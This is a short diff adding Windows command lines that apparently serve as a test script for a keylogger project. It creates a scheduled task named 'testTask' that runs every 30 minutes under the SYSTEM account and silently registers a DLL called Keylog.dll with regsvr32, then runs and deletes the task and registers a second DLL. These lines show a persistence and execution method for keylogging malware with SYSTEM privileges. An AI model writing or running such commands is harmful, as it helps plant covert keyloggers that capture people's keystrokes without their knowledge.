@@ -1,0 +1,5 @@
+schtasks /F /create /TN testTask /TR "regsvr32 -s D:\\Space\\Safe\\Keylog\\x64\\Debug\\Keylog.dll" /SC MINUTE /mo 30 /RU SYSTEM
+schtasks /RUN /TN testTask
+schtasks /delete /TN testTask
+
+regsvr32 D:\Space\Windows\Dll1\x64\Debug\dll1.dll
